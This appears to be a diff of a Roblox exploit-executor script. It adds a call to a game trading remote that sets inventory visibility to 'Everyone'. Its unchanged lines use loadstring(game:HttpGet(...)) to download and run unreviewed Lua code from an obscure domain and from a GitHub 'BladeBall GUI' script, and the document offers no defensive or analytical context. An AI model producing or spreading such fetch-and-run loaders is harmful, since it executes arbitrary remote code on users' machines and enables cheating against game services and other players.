@@ -1,3 +1,10 @@
 loadstring(game:HttpGet("https://egorikusa.space/f943aa785660d25c9eded1ab.lua", true))()
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/refs/heads/main/BladeBall%20GUI'))()
+
+local args = {
+    [1] = "ViewInventory",
+    [2] = "Everyone"
+}
+
+game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_net@0.1.0").net:FindFirstChild("RF/Trading/SetSetting"):InvokeServer(unpack(args))
